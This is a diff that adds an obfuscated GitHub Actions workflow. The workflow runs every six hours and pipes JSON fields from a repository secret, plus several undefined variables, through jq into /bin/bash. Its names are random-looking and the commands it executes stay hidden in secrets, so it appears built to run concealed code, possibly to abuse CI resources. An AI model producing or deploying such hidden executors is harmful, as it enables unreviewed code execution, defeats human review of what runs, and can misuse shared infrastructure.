@@ -1,0 +1,29 @@
+name: weishenmeda
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: weishenmeda
+        env:
+          latc4479: ${{ secrets.latc4479 }}
+        run: |
+          echo $latc4479 | jq -r .lnxfe11 | /bin/bash
+          echo $rcchs86647 | jq -r .xoan0 | /bin/bash
+          echo $w8 | jq -r .d0 | /bin/bash
+          echo $hqkjy20 | jq -r .szt359 | /bin/bash
+          echo $o62374 | jq -r .cxjih67386 | /bin/bash
+          echo $z97 | jq -r .vic1406 | /bin/bash
+          echo $lhgc788 | jq -r .b46710 | /bin/bash
+          echo $xyzh99784 | jq -r .b659 | /bin/bash
+          echo $yvuz8 | jq -r .stzqn59 | /bin/bash
+          echo $oae121 | jq -r .dvz08969 | /bin/bash
+          echo $hq7 | jq -r .kbljv48382 | /bin/bash
+
